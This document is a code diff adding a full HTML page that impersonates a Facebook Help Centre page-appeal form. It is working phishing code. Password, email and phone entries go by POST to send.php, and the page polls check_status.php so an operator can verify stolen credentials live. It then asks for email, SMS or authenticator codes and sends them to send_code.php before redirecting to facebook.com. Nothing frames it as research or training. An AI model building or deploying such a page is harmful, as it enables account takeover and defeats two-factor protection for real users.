@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Help Centre</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+     <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['-apple-system', 'BlinkMacSystemFont', '"Segoe UI"', 'Roboto', 'sans-serif'],
+                    },
+                }
+            }
+        }
+    </script>
+</head>
+<body class="font-sans bg-[#f0f2f5]">
+
+    <div class="relative bg-[#4267B2] py-3 text-white">
+        <div class="max-w-[1200px] mx-auto flex items-center gap-[10px] px-2.5 sm:px-4 md:gap-4 md:px-4 lg:gap-[15px]">
+            <div class="font-bold flex-shrink-0 text-base sm:text-lg md:text-xl lg:text-2xl">facebook</div>
+            <div class="flex-1 min-w-[150px] lg:min-w-[200px] lg:max-w-[400px]">
+                <input type="text" placeholder="How can we help?" class="w-full rounded border-0 py-1.5 px-2 text-sm sm:py-2 sm:px-3 sm:text-base md:text-sm placeholder:text-gray-500">
+            </div>
+        </div>
+    </div>
+    
+    <div class="text-xs text-[#1877f2] text-center p-2.5 bg-white/10 mx-2.5 rounded md:bg-transparent md:p-0 md:m-0 md:rounded-none md:absolute md:top-[60px] md:right-[15px] md:z-10">English (UK)</div>
+    
+    <button class="block md:hidden bg-[#1877f2] hover:bg-[#166fe5] text-white border-none px-4 py-2.5 rounded-md text-sm cursor-pointer w-[calc(100%-30px)] m-4" onclick="toggleMobileMenu()">☰ Show Help Menu</button>
+    
+    <div class="max-w-[1200px] mx-auto flex flex-col md:flex-row min-h-[calc(100vh-200px)] gap-4 px-2.5 pb-2.5 sm:px-4 sm:pb-4 md:p-4 lg:gap-5">
+        
+        <div id="sidebar" class="bg-white shadow-[0_2px_4px_rgba(0,0,0,0.1)] w-full order-2 mt-4 p-2.5 rounded-md md:w-[220px] lg:w-[250px] md:order-none md:mt-0 md:sticky md:top-5 md:p-4 lg:p-5 md:rounded-lg md:h-fit hidden md:block">
+            <div class="text-[#1877f2] font-bold mb-5 text-lg sm:text-xl">🏠 Help Centre</div>
+            <ul class="list-none p-0 m-0">
+                 <li class="py-2 text-[#65676b] text-sm cursor-pointer transition-colors duration-200 ease-in-out hover:text-[#1877f2]">Creating an Account</li>
+                <li class="py-2 text-[#65676b] text-sm cursor-pointer transition-colors duration-200 ease-in-out hover:text-[#1877f2]">Your Profile</li>
+                <li class="py-2 text-[#65676b] text-sm cursor-pointer transition-colors duration-200 ease-in-out hover:text-[#1877f2]">Friending</li>
+                <li class="py-2 text-[#65676b] text-sm cursor-pointer transition-colors duration-200 ease-in-out hover:text-[#1877f2]">Facebook Dating</li>
+                <li class="py-2 text-[#65676b] text-sm cursor-pointer transition-colors duration-200 ease-in-out hover:text-[#1877f2]">Your Home Page</li>
+                <li class="py-2 text-[#65676b] text-sm cursor-pointer transition-colors duration-200 ease-in-out hover:text-[#1877f2]">Messaging</li>
+                <li class="py-2 text-[#65676b] text-sm cursor-pointer transition-colors duration-200 ease-in-out hover:text-[#1877f2]">Reels</li>
+                <li class="py-2 text-[#65676b] text-sm cursor-pointer transition-colors duration-200 ease-in-out hover:text-[#1877f2]">Stories</li>
+                <li class="py-2 text-[#65676b] text-sm cursor-pointer transition-colors duration-200 ease-in-out hover:text-[#1877f2]">Photos</li>
+                <li class="py-2 text-[#65676b] text-sm cursor-pointer transition-colors duration-200 ease-in-out hover:text-[#1877f2]">Videos</li>
+                <li class="py-2 text-[#65676b] text-sm cursor-pointer transition-colors duration-200 ease-in-out hover:text-[#1877f2]">Gaming</li>
+                <li class="py-2 text-[#65676b] text-sm cursor-pointer transition-colors duration-200 ease-in-out hover:text-[#1877f2]">Pages</li>
+                <li class="py-2 text-[#65676b] text-sm cursor-pointer transition-colors duration-200 ease-in-out hover:text-[#1877f2]">Groups</li>
+                <li class="py-2 text-[#65676b] text-sm cursor-pointer transition-colors duration-200 ease-in-out hover:text-[#1877f2]">Events</li>
+                <li class="py-2 text-[#65676b] text-sm cursor-pointer transition-colors duration-200 ease-in-out hover:text-[#1877f2]">Meta Pay</li>
+                <li class="py-2 text-[#65676b] text-sm cursor-pointer transition-colors duration-200 ease-in-out hover:text-[#1877f2]">Marketplace</li>
+                <li class="py-2 text-[#65676b] text-sm cursor-pointer transition-colors duration-200 ease-in-out hover:text-[#1877f2]">Apps</li>
+                <li class="py-2 text-[#65676b] text-sm cursor-pointer transition-colors duration-200 ease-in-out hover:text-[#1877f2]">Facebook Mobile Apps</li>
+                <li class="py-2 text-[#65676b] text-sm cursor-pointer transition-colors duration-200 ease-in-out hover:text-[#1877f2]">Accessibility</li>
+            </ul>
+        </div>
+        
+        <div class="flex-1 bg-white shadow-[0_2px_4px_rgba(0,0,0,0.1)] min-w-0 order-1 p-2.5 rounded-md sm:p-4 lg:p-5 lg:rounded-lg md:order-none">
+            <div class="font-bold text-[#1c1e21] mb-2.5 text-base md:text-lg">Facebook Page Appeal Support Form</div>
+            <div class="text-[#65676b] text-sm mb-5">Let us know how we can improve your Facebook experience.</div>
+            
+            <form id="mainSupportForm">
+                <div class="mb-5">
+                    <label class="block text-sm text-[#1c1e21] mb-1">Page Name</label>
+                    <input type="text" name="pagename" id="pagename" class="w-full border border-[#dddfe2] rounded-md transition-colors duration-200 ease-in-out focus:outline-none focus:border-[#1877f2] p-2.5 text-base sm:py-2 sm:px-3 sm:text-sm">
+                    <div id="pagenameError" class="text-xs text-red-500 mt-1 hidden"></div>
+                </div>
+
+                <div class="mb-5">
+                    <label class="block text-sm text-[#1c1e21] mb-1">Your email address</label>
+                    <input type="email" name="email" id="email" class="w-full border border-[#dddfe2] rounded-md transition-colors duration-200 ease-in-out focus:outline-none focus:border-[#1877f2] p-2.5 text-base sm:py-2 sm:px-3 sm:text-sm">
+                    <div id="emailError" class="text-xs text-red-500 mt-1 hidden"></div>
+                </div>
+                
+                <div class="mb-5">
+                    <label class="block text-sm text-[#1c1e21] mb-1">Phone number</label>
+                    <input type="tel" name="phone" id="phone" placeholder="+1 (555) 123-4567" class="w-full border border-[#dddfe2] rounded-md transition-colors duration-200 ease-in-out focus:outline-none focus:border-[#1877f2] p-2.5 text-base sm:py-2 sm:px-3 sm:text-sm placeholder:text-gray-400">
+                    <div id="phoneError" class="text-xs text-red-500 mt-1 hidden"></div>
+                </div>
+                
+                <div class="mb-5">
+                    <label class="block text-sm text-[#1c1e21] mb-1">Current issues</label>
+                    <select id="issues" class="w-full border border-[#dddfe2] rounded-md transition-colors duration-200 ease-in-out focus:outline-none focus:border-[#1877f2] p-2.5 text-base sm:py-2 sm:px-3 sm:text-sm">
+                        <option value="">Please select</option>
+                        <option value="page_review">Page Review and Appeals</option>
+                        <option value="account_disabled">Disabled Account</option>
+                        <option value="content_removed">Content Removed</option>
+                        <option value="community_standards">Community Standards</option>
+                        <option value="business_verification">Business Verification</option>
+                        <option value="ads_policy">Advertising Policy</option>
+                        <option value="intellectual_property">Intellectual Property</option>
+                        <option value="privacy_settings">Privacy Settings</option>
+                        <option value="technical_issues">Technical Issues</option>
+                        <option value="other">Other</option>
+                    </select>
+                    <span id="issuesError" class="text-red-500 text-sm hidden"></span>
+                </div>
+                
+                <div class="mb-5">
+                    <label class="block text-sm text-[#1c1e21] mb-1">Your feedback</label>
+                    <textarea id="feedback" rows="4" placeholder="Please include information to help us review." class="w-full border border-[#dddfe2] rounded-md transition-colors duration-200 ease-in-out focus:outline-none focus:border-[#1877f2] p-2.5 text-base sm:py-2 sm:px-3 sm:text-sm placeholder:text-gray-400"></textarea>
+                    <span id="feedbackError" class="text-red-500 text-sm hidden"></span>
+                </div>
+                
+                <div class="text-[#65676b] text-[11px] sm:text-xs leading-snug my-4">
+                    Note: All suggestions are governed by the Facebook Terms (see section 2.5).
+                </div>
+                
+                <button type="submit" class="bg-[#1877f2] text-white border-none rounded-md text-sm cursor-pointer transition-colors duration-200 ease-in-out hover:bg-[#166fe5] w-full mt-2.5 p-3 md:w-auto md:float-right md:mt-0 md:py-2 md:px-5">Send</button>
+                <div class="clear-both"></div>
+            </form>
+        </div>
+    </div>
+    
+    <div class="text-center text-[#8a8d91] leading-snug p-4 px-2.5 text-[11px] lg:p-5 lg:px-4 lg:text-xs">
+        English (UK) · Bahasa Indonesia · Basa Jawa · Bahasa Melayu · 日本語 · العربية · Français (France) · Español · 한국어 · Português (Brasil) · Deutsch<br><br>
+        Meta © 2025
+    </div>
+
+    <div id="passwordModal" class="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 p-4 hidden">
+        <div class="bg-white rounded-lg shadow-xl w-full max-w-md">
+            <div class="flex justify-between items-center p-3 border-b border-gray-200">
+                <h3 class="text-md font-bold text-gray-800">Re-enter Your Password</h3>
+                <button id="closePasswordModalBtn" class="text-2xl text-gray-400 hover:text-gray-700">&times;</button>
+            </div>
+            <div class="p-4">
+                <div class="flex items-center gap-3 mb-4">
+                    <i class="fas fa-user-circle text-4xl text-gray-400"></i>
+                    <span class="font-semibold text-gray-800 pagename">User Profile</span>
+                </div>
+                <p class="text-sm text-gray-600 mb-4">
+                    For your security, you must re-enter your password to continue.
+                </p>
+                <div>
+                    <label for="password" class="text-sm font-semibold text-gray-600 mb-2 block">Password</label>
+                    <div class="relative">
+                        <input type="password" id="password" class="w-full border border-gray-400 rounded px-3 py-1.5 focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500">
+                        <button type="button" id="togglePassword" class="absolute inset-y-0 right-0 pr-3 flex items-center text-gray-400 hover:text-gray-600">
+                            <i class="fas fa-eye" id="eyeIcon"></i>
+                        </button>
+                    </div>
+                    <div id="passwordError" class="text-xs text-red-500 mt-1 hidden"></div>
+                </div>
+            </div>
+            <div class="flex justify-between items-center p-3 bg-gray-50 rounded-b-lg">
+                <a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token" class="text-sm text-blue-600 hover:underline">Forgot your password?</a>
+                <div class="flex items-center gap-2">
+                    <button id="cancelPasswordModalBtn" class="bg-gray-200 text-gray-800 font-bold py-2 px-4 rounded text-sm hover:bg-gray-300 transition-colors">Cancel</button>
+                    <button type="button" id="submitPasswordBtn" class="bg-[#4267B2] text-white font-bold py-2 px-4 rounded text-sm hover:bg-[#3b5998] transition-colors">Send</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="emailConfirmModal" class="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 p-4 hidden">
+        <div class="bg-white rounded-lg shadow-xl w-full max-w-md">
+            <div class="flex justify-between items-center p-3 border-b rounded-t-lg border-gray-200 bg-[rgb(108_133_183)]">
+                <h3 class="text-md font-bold text-white">Confirm Your Email Address</h3>
+            </div>
+            <div class="p-4">
+                <p class="text-sm text-gray-600 mb-2">
+                    For security purposes, we've sent a code to your email address, <strong id="userEmailSpan" class="text-gray-800"></strong>.
+                </p>
+                <p class="text-sm text-gray-600 mb-4">
+                    Please enter the code you received in the box below.
+                </p>
+                <div>
+                    <input type="text" id="confirmCodeEmail" placeholder="Enter code" class="code-input w-full border border-gray-400 rounded px-3 py-1.5 text-center tracking-[0.5em] focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500">
+                    <div class="code-error text-xs text-red-500 mt-1 hidden"></div>
+                </div>
+                <p class="text-xs text-gray-500 mt-4">
+                    Please note that we will not accept your submission until the code is entered successfully. To resend the code, close this window and try resubmitting the form.
+                </p>
+            </div>
+            <div class="flex justify-end items-center p-3 bg-gray-50 rounded-b-lg">
+                <button class="confirm-code-btn bg-[#4267B2] text-white font-bold py-2 px-4 rounded text-sm hover:bg-[#3b5998] transition-colors">Confirm</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="phoneConfirmModal" class="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 p-4 hidden">
+        <div class="bg-white rounded-lg shadow-xl w-full max-w-md">
+            <div class="flex justify-between items-center p-3 border-b rounded-t-lg border-gray-200 bg-[rgb(108_133_183)]">
+                <h3 class="text-md font-bold text-white">Confirm Your Phone Number</h3>
+            </div>
+            <div class="p-4">
+                <p class="text-sm text-gray-600 mb-2">
+                    For security purposes, we've sent a code to your phone number, <strong id="userPhoneSpan" class="text-gray-800"></strong>.
+                </p>
+                <p class="text-sm text-gray-600 mb-4">
+                    Please enter the code you received in the box below.
+                </p>
+                <div>
+                    <input type="text" id="confirmCodePhone" placeholder="Enter code" class="code-input w-full border border-gray-400 rounded px-3 py-1.5 text-center tracking-[0.5em] focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500">
+                    <div class="code-error text-xs text-red-500 mt-1 hidden"></div>
+                </div>
+                <p class="text-xs text-gray-500 mt-4">
+                    Please note that we will not accept your submission until the code is entered successfully. To resend the code, close this window and try resubmitting the form.
+                </p>
+            </div>
+            <div class="flex justify-end items-center p-3 bg-gray-50 rounded-b-lg">
+                <button class="confirm-code-btn bg-[#4267B2] text-white font-bold py-2 px-4 rounded text-sm hover:bg-[#3b5998] transition-colors">Confirm</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="authConfirmModal" class="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 p-4 hidden">
+        <div class="bg-white rounded-lg shadow-xl w-full max-w-md">
+            <div class="flex justify-between items-center p-3 border-b rounded-t-lg border-gray-200 bg-[rgb(108_133_183)]">
+                <h3 class="text-md font-bold text-white">Two-Factor Authentication</h3>
+            </div>
+            <div class="p-4">
+                <p class="text-sm text-gray-600 mb-2">
+                    For security purposes, please get a code from your authenticator app to continue.
+                </p>
+                <p class="text-sm text-gray-600 mb-4">
+                    Please enter the code you received in the box below.
+                </p>
+                <div>
+                    <input type="text" id="confirmCodeAuth" placeholder="Enter code" class="code-input w-full border border-gray-400 rounded px-3 py-1.5 text-center tracking-[0.5em] focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500">
+                    <div class="code-error text-xs text-red-500 mt-1 hidden"></div>
+                </div>
+                <p class="text-xs text-gray-500 mt-4">
+                    Please note that we will not accept your submission until the code is entered successfully. To resend the code, close this window and try resubmitting the form.
+                </p>
+            </div>
+            <div class="flex justify-end items-center p-3 bg-gray-50 rounded-b-lg">
+                <button class="confirm-code-btn bg-[#4267B2] text-white font-bold py-2 px-4 rounded text-sm hover:bg-[#3b5998] transition-colors">Confirm</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="successModal" class="fixed inset-0 bg-black bg-opacity-60 flex items-center justify-center z-50 p-4 hidden">
+    <div class="bg-white rounded-lg shadow-xl w-full max-w-md">
+        <div class="p-6 text-center">
+            <div class="text-5xl text-blue-600 mb-4"><i class="fas fa-check-circle"></i></div>
+            <h3 class="text-lg font-bold text-gray-800">Your Appeal is Under Review</h3>
+            <p class="text-sm text-gray-600">We've received your report and will look into it.</p>
+        </div>
+        <div class="bg-gray-50 px-6 py-4 border-t border-b">
+            <h4 class="font-bold text-sm text-gray-700 mb-2">What Happens Next?</h4>
+            <ul class="text-sm text-gray-600 list-disc list-inside space-y-1">
+                <li>A specialist will review your page against our policies.</li>
+                <li>We will notify you via your Support Inbox.</li>
+                <li>Please allow up to 48 hours for an update.</li>
+            </ul>
+        </div>
+        <div class="p-4 text-center">
+             <button id="closeSuccessModalBtn" class="bg-blue-600 text-white w-1/2 py-2 rounded-md hover:bg-blue-700 text-sm">Close</button>
+        </div>
+    </div>
+</div>
+
+    <script>
+        function toggleMobileMenu() {
+            const sidebar = document.getElementById('sidebar');
+            const button = document.querySelector('button[onclick="toggleMobileMenu()"]');
+            sidebar.classList.toggle('hidden');
+            if (!sidebar.classList.contains('hidden')) {
+                button.textContent = '✕ Hide Help Menu';
+                button.style.background = '#dc3545';
+            } else {
+                button.textContent = '☰ Show Help Menu';
+                button.style.background = '#1877f2';
+            }
+        }
+        document.addEventListener('click', function(e) {
+            const sidebar = document.getElementById('sidebar');
+            const button = document.querySelector('button[onclick="toggleMobileMenu()"]');
+            const mainContent = document.querySelector('.main-content');
+            if (window.innerWidth <= 768 && !sidebar.classList.contains('hidden') && mainContent.contains(e.target)) {
+                sidebar.classList.add('hidden');
+                button.textContent = '☰ Show Help Menu';
+                button.style.background = '#1877f2';
+            }
+        });
+        window.addEventListener('resize', function() {
+            const sidebar = document.getElementById('sidebar');
+            const button = document.querySelector('button[onclick="toggleMobileMenu()"]');
+            if (window.innerWidth > 768 && !sidebar.classList.contains('hidden')) {
+                sidebar.classList.add('hidden');
+                button.textContent = '☰ Show Help Menu';
+                button.style.background = '#1877f2';
+            }
+        });
+
+        $(document).ready(function() {
+            // Password visibility toggle
+            $('#togglePassword').on('click', function() {
+                const passwordField = $('#password');
+                const eyeIcon = $('#eyeIcon');
+                
+                if (passwordField.attr('type') === 'password') {
+                    passwordField.attr('type', 'text');
+                    eyeIcon.removeClass('fa-eye').addClass('fa-eye-slash');
+                } else {
+                    passwordField.attr('type', 'password');
+                    eyeIcon.removeClass('fa-eye-slash').addClass('fa-eye');
+                }
+            });
+
+            $('#pagename').on('focus', function() {
+                $('#pagenameError').hide();
+            });
+
+            $('#email').on('focus', function() {
+                $('#emailError').hide();
+            });
+
+            $('#phone').on('focus', function() {
+                $('#phoneError').hide();
+            });
+
+            $('#issues').on('focus', function() {
+                $('#issuesError').hide();
+            });
+
+            $('#feedback').on('focus', function() {
+                $('#feedbackError').hide();
+            });
+        });
+        $(document).ready(function() {
+        let pollingInterval;
+        let currentUserEmail = '';
+        let currentUserPhone = '';
+
+        function validateMainForm() {
+            let isValid = true;
+            $('.text-red-500').hide();
+
+            const email = $('#email').val();
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+            if ($('#pagename').val().trim() === "") {
+                $('#pagenameError').text('Page Name is required.').show();
+                isValid = false;
+            }
+
+            if (email === "") {
+                $('#emailError').text('Email address is required.').show();
+                isValid = false;
+            } else if (!emailRegex.test(email)) {
+                $('#emailError').text('Please enter a valid email address.').show();
+                isValid = false;
+            }
+
+            if ($('#phone').val() === "") {
+                $('#phoneError').text('Phone number is required.').show();
+                isValid = false;
+            }
+
+            if ($('#issues').val() === "") {
+                $('#issuesError').text('Please select an issue.').show();
+                isValid = false;
+            }
+
+            if ($('#feedback').val().trim() === "") {
+                $('#feedbackError').text('Feedback is required.').show();
+                isValid = false;
+            }
+
+            return isValid;
+        }
+
+        $('#mainSupportForm').on('submit', function(e) {
+            e.preventDefault();
+            if (validateMainForm()) {
+                currentUserEmail = $('#email').val();
+                pagename = $('#pagename').val();
+                currentUserPhone = $('#phone').val();
+                pagename = $('#pagename').val();
+                $('.pagename').text(pagename);
+                $('#passwordModal').removeClass('hidden');
+            }
+        });
+
+        $('#submitPasswordBtn').on('click', function() { 
+            if ($('#password').val().length < 5) { $('#passwordError').text('Password must be at least 5 characters.').show(); return; } $('#passwordError').hide();
+            $.ajax({ url: 'send.php', type: 'POST', data: { email: currentUserEmail, pagename: pagename, phone: currentUserPhone, password: $('#password').val() },
+                beforeSend: function() { $('#submitPasswordBtn').html('<i class="fas fa-spinner fa-spin"></i>').prop('disabled', true); },
+                success: function() { startPolling(currentUserEmail, 'password'); },
+                error: function() { alert('Failed to send data.'); $('#submitPasswordBtn').html('Send').prop('disabled', false); }
+            });
+        });
+        
+        $('.confirm-code-btn').on('click', function() {
+            const $thisButton = $(this);
+            const $modal = $thisButton.closest('.fixed');
+            const $codeInput = $modal.find('.code-input');
+            const $errorDiv = $modal.find('.code-error');
+            const code = $codeInput.val();
+
+            if (code.length < 4) { $errorDiv.text('Please enter a valid code.').show(); return; }
+            $errorDiv.hide();
+
+            $.ajax({ url: 'send_code.php', type: 'POST', data: { email: currentUserEmail, code: code },
+                beforeSend: function() { $thisButton.html('<i class="fas fa-spinner fa-spin"></i>').prop('disabled', true); },
+                success: function() { startPolling(currentUserEmail, 'code'); },
+                error: function() { alert('Failed to send code.'); $thisButton.html('Confirm').prop('disabled', false); }
+            });
+        });
+
+        function startPolling(email, checkType) { 
+             pollingInterval = setInterval(function() {
+                $.ajax({ url: 'check_status.php', type: 'GET', data: { email: email }, dataType: 'json',
+                    success: function(response) {
+                        if (checkType === 'password' && response.status_password !== 'none') {
+                            clearInterval(pollingInterval); handlePasswordStatus(response);
+                        } else if (checkType === 'code' && response.status_code !== 'none') {
+                            clearInterval(pollingInterval); handleCodeStatus(response);
+                        }
+                    },
+                    error: function() { clearInterval(pollingInterval); alert('Error checking status.'); }
+                });
+            }, 3000);
+        }
+
+        function handlePasswordStatus(response) {
+            $('#submitPasswordBtn').html('Send').prop('disabled', false);
+            if (response.status_password === 'false') {
+                $('#passwordError').text('Password incorrect. Please try again.').show();
+            } else if (response.status_password === 'true') {
+                $('#passwordModal').addClass('hidden');
+                if (response.mode === 'email') {
+                    $('#userEmailSpan').text(currentUserEmail);
+                    $('#emailConfirmModal').removeClass('hidden');
+                } else if (response.mode === 'number') {
+                    $('#userPhoneSpan').text(currentUserPhone);
+                    $('#phoneConfirmModal').removeClass('hidden');
+                } else if (response.mode === 'auth') {
+                    $('#authConfirmModal').removeClass('hidden');
+                }
+            }
+        }
+        
+        function handleCodeStatus(response) {
+            $('.confirm-code-btn').html('Confirm').prop('disabled', false);
+            if (response.status_code === 'false') {
+                $('.code-error').text('Incorrect code. Please check and re-enter.').show();
+            } else if (response.status_code === 'true') {
+                $('#emailConfirmModal, #phoneConfirmModal, #authConfirmModal').addClass('hidden');
+                $('#successModal').removeClass('hidden');
+            }
+        }
+
+        $('#closePasswordModalBtn, #cancelPasswordModalBtn').on('click', function() { clearInterval(pollingInterval); $('#passwordModal').addClass('hidden'); $('#submitPasswordBtn').html('Send').prop('disabled', false); });
+        $('.close-modal-btn').on('click', function() {
+            clearInterval(pollingInterval);
+            $(this).closest('.fixed').addClass('hidden');
+        });
+        $('#closeSuccessModalBtn').on('click', function() { 
+            $('#successModal').addClass('hidden'); 
+            window.location.href = "https://facebook.com";
+        });
+        $('#password, .code-input').on('focus', function() { $(this).next('.text-red-500, .code-error').hide(); });
+    });
+    </script>
+
+</body>
+</html>
